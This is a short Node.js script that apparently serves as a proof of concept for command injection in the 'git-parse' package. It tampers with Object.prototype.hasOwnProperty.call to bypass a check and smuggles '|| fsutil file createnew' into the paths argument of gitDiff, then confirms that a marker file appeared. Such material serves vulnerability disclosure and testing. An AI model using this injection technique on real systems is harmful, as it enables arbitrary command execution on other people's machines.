Object.prototype.hasOwnProperty.call = () => true;
const x = require('git-parse');
const fs = require('fs');
const path = './git-parse';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
const paths = '. || fsutil file createnew git-parse 0';
console.log(x.gitDiff('.', 445454, 1545, paths).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));